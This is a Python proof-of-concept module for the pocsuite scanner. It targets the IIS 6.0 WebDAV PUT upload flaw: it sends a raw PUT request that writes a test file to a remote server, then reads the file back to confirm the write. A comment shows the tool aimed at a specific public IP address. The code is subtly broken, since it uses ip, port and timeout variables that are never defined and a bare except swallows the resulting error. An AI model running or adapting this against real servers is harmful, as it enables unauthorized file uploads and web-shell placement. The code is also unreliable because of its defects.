#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class IiswebdavPOC(POCBase):
    vulID = '15'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-07-11' #漏洞公开的时间,不知道就写今天

    author = 'wolf@YSRC' #  PoC作者的大名
    createDate = '2017-07-11'# 编写 PoC 的日期
    updateDate = '2017-07-11'# PoC 更新的时间,默认和编写时间一样
    references = 'http://www.cnblogs.com/cnhacker/p/6999102.html'# 漏洞地址来源,0day不用写
    name = 'iis webdav PUT getshell'# PoC 名称
    appPowerLink = 'https://www.iis.net/'# 漏洞厂商主页地址
    appName = 'iis'# 漏洞应用名称
    appVersion = 'iis 6.0'# 漏洞影响版本
    vulType = 'file-upload'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        iis6.0 PUT写文件漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 15-WebDav-getshell.py -u 101.49.63.18 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url

        import socket
        import time
        import urllib2

        try:
            socket.setdefaulttimeout(5)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:80\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % vul_url
            s.send(flag)
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                url = vul_url + '/vultest.txt'
                request = urllib2.Request(url)
                res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
                if 'xxscan0' in res_html:
                    print u"iis webdav漏洞"
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Payload'] = flag
            else:
                #print u'\n【不存在漏洞】 ' + url
                pass
        except:
            # return url
            pass
        print '[+]15 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(IiswebdavPOC)



